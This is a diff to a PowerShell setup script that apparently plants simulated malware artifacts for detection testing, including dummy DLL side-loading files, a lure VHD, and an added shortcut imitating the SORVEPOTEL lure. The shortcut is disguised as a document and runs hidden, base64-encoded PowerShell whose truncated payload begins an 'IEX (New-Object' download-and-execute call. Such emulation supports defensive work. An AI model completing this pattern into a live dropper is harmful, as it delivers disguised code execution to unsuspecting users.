@@ -100,6 +100,12 @@ New-Item -ItemType Directory -Force -Path $tdir | Out-Null
 Set-Content -Path "$tdir\Thunder.exe" -Value 'dummy'
 Set-Content -Path "$tdir\libexpat.dll" -Value 'dummy'
 
+# SORVEPOTEL: a document-named shortcut that runs hidden PowerShell (never opened)
+$lnkS = (New-Object -ComObject WScript.Shell).CreateShortcut("$dl\DOC-50998906_17774E7A.lnk")
+$lnkS.TargetPath = "$env:SystemRoot\System32\cmd.exe"
+$lnkS.Arguments = '/D/C "for %Y in (nc) do powershell -w hid -e%Y SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"'
+$lnkS.Save()
+
 # Mounted lure VHD
 $vhd = "$dl\Click here to view10.6.vhd"
 "create vdisk file=`"$vhd`" maximum=8 type=fixed`nattach vdisk" | Out-File -Encoding ASCII "$env:TEMP\dp.txt"
